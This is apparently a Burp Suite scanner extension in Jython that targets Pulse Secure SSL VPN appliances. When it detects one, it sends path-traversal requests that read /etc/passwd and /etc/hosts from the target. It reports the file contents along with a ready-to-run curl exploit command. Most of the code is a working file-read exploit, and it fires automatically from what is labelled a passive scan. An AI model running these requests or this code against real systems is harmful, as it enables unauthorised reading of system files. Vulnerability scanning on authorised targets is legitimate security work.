from burp import IScannerCheck
from burp import IBurpExtender
from burp import IScanIssue
from java.io import PrintWriter
from array import array
from urlparse import urlparse
from os import path
from java.net import URL
import ssl
import socket



class BurpExtender(IBurpExtender,IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Pulse SSL VPN Arbitrary File Read Scanner")
        dout = PrintWriter(callbacks.getStdout(), True)
        derr = PrintWriter(callbacks.getStderr(), True)
        dout.println("Pulse SSL VPN Arbitrary File Read Scanner | by twitter.com/0x94")
        callbacks.registerScannerCheck(self)
        
    def _get_matches(self, response, match):
        matches = []
        start = 0
        reslen = len(response)
        matchlen = len(match)
        while start < reslen:
            start = self._helpers.indexOf(response, match, True, start, reslen)
            if start == -1:
                break
            matches.append(array('i', [start, start + matchlen]))
            start += matchlen
   
        return matches

    def etc_getir(self,host):
        try:
            ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            sock = ctx.wrap_socket(socket.create_connection((host, 443)),server_hostname=host)
            sock.send(b"GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1\r\nhost: "+host+"\r\n\r\n")
            resp = sock.recv(4096)
            if "root:x:0:0:root" in resp:
                return resp
            else:
                return ""

        except Exception as e:
            print "Connection Error! "
            return ""
        
        
    def host_getir(self,host):
        try:
            ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            sock = ctx.wrap_socket(socket.create_connection((host, 443)),server_hostname=host)
            sock.send(b"GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/ HTTP/1.1\r\nhost: "+host+"\r\n\r\n")
            resp = sock.recv(4096)
            return resp
    
        except Exception as e:
            print "Connection Error! "
            return ""     
    
    def altaal(self,data):
        sonuc=""
        for m in data.split("\n"):
            sonuc+=m+"<br>"
        return sonuc
            
            

    def doPassiveScan(self, baseRequestResponse):
        my=""
        self.findkey=["/dana-na","Pulse Secure"]
        for keyim in self.findkey:
            matches = self._get_matches(baseRequestResponse.getResponse(), keyim)
            if (len(matches) > 0):
                x=str(self._helpers.analyzeRequest(baseRequestResponse).getUrl())
                y=urlparse(x)
                my=self.etc_getir(y.hostname)
                if "root:x:0:0:root" in my:
                    
                    etcpwd = "<p>"+(my)+"</p>"
                    hostsdata=self.host_getir(y.hostname)
                    
                    text=self.altaal(etcpwd)+"</p><p>"+self.altaal(hostsdata)+"</p> info : <p> curl --path-as-is -s -k \"https://"+y.hostname+"/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/\" </p>"
                    
                
                #text = ()            
                    return [CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(baseRequestResponse, None, matches)],
                    "Pulse SSL VPN Arbitrary File Read",
                    text,
                    "High")]    



class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
